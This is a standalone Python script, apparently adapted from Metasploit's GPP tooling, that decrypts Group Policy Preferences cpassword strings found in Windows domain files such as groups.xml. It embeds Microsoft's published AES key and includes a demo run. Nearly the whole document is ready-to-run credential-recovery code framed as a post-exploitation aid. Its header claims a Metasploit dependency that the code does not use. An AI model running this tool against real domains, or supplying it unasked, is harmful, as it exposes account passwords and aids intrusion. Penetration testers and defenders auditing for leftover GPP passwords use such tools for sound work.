#!/usr/bin/env python3
# -*- coding: utf-8 -*-

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

"""
This script will allow you to specify an encrypted cpassword string using Microsoft's public
AES key. This is useful if you don't or can't use the GPP post exploitation module. Just paste
the cpassword encrypted string found in groups.xml or scheduledtasks.xml and it will output the
decrypted string for you.

Tested Windows Server 2008 R2 Domain Controller.

Authors:
  Ben Campbell <eat_meatballs[at]hotmail.co.uk>
  Loic Jaquemet <loic.jaquemet+msf[at]gmail.com>
  scriptmonkey <scriptmonkey[at]owobble.co.uk>
  theLightCosine
  mubix (domain/dc enumeration code)
  David Kennedy "ReL1K" <kennedyd013[at]gmail.com>

References:
  http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences
  http://msdn.microsoft.com/en-us/library/cc232604(v=prot.13)
  http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html
  http://blogs.technet.com/grouppolicy/archive/2009/04/22/passwords-in-group-policy-preferences-updated.aspx

Demo:
  $ ./cpassword_decrypt.py AzVJmXh/J9KrU5n0czX1uBPLSUjzFE8j7dOltPD8tLk
  [+] The decrypted AES password is: testpassword
"""

import sys
import base64
from Crypto.Cipher import AES


class CPassword:
    """
    Decrypt Group Policy Preferences cpassword strings
    """
    
    # Microsoft's published AES key for GPP passwords
    GPP_KEY = (
        b'\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8'
        b'\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b'
    )
    
    def decrypt(self, encrypted_data):
        """
        Decrypts the AES-encrypted cpassword string
        
        Args:
            encrypted_data: The encrypted cpassword string
        
        Returns:
            The decrypted string in ASCII
        """
        # Add padding if needed
        padding = '=' * (4 - (len(encrypted_data) % 4))
        if padding != '====':
            epassword = encrypted_data + padding
        else:
            epassword = encrypted_data
        
        try:
            # Decode the base64 string
            decoded = base64.b64decode(epassword)
            
            # Decrypt using AES-256-CBC with zero IV
            cipher = AES.new(self.GPP_KEY, AES.MODE_CBC, b'\x00' * 16)
            plaintext = cipher.decrypt(decoded)
            
            # GPP passwords are stored as UTF-16LE
            # Remove PKCS7 padding first
            if len(plaintext) > 0:
                padding_len = plaintext[-1]
                if isinstance(padding_len, str):
                    padding_len = ord(padding_len)
                # Validate padding
                if 1 <= padding_len <= 16 and all(b == padding_len for b in plaintext[-padding_len:]):
                    plaintext = plaintext[:-padding_len]
            
            # Decode UTF-16LE and strip any remaining null bytes
            return plaintext.decode('utf-16-le').rstrip('\x00')
            
        except Exception:
            # Decryption failed possibly due to bad input
            return ''


def print_status(msg=''):
    """Prints a status message"""
    print(f"[*] {msg}", file=sys.stderr)


def print_error(msg=''):
    """Prints an error message"""
    print(f"[-] {msg}", file=sys.stderr)


def print_good(msg=''):
    """Prints a good message"""
    print(f"[+] {msg}", file=sys.stderr)


def usage():
    """Shows script usage"""
    print_status(f"Usage: {sys.argv[0]} [The encrypted cpassword string]")
    sys.exit(1)


def main():
    """Main function"""
    if len(sys.argv) < 2 or not sys.argv[1]:
        usage()
    
    encrypted_pass = sys.argv[1]
    
    cpasswd = CPassword()
    decrypted_pass = cpasswd.decrypt(encrypted_pass)
    
    if not decrypted_pass:
        print_error("Nothing was decrypted, please check your input.")
        sys.exit(1)
    else:
        print_good(f"The decrypted AES password is: {decrypted_pass}")


if __name__ == '__main__':
    main()
